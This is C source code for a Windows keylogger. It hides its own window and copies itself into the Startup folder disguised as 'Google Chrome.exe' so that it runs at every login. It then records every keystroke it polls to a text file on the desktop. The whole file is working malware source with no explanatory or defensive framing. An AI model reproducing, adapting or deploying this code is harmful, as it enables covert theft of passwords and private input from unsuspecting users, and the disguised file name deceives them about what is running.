#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <locale.h>

void getWords();
int fileExists(char *file);
void hideProgram();

int main(int argc, char* argv[])
{
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	hideProgram(argv[0]);	

	while(1)
	{
		Sleep(1);
		getWords();
	}
	return 0;
}


void getWords()
{	
	int resultado, tecla;
	FILE *file = NULL;
	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");

	for(tecla = 0; tecla <= 255; tecla++)
	{
		resultado = GetAsyncKeyState(tecla);

		if(resultado == -32767) {
			fprintf(file,"%c",tecla);
			printf("%c",tecla);
		}
	}
	fclose(file);
}

void hideProgram(char* file)
{
	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
	if(!fileExists(destino)){
		CopyFile(file,destino,0);
	}
}

int fileExists(char *file)
{
    FILE *fp;
	fp = fopen(file,"r");
	if(fp){
		fclose(fp);
		return 1;
	}
	return 0;
}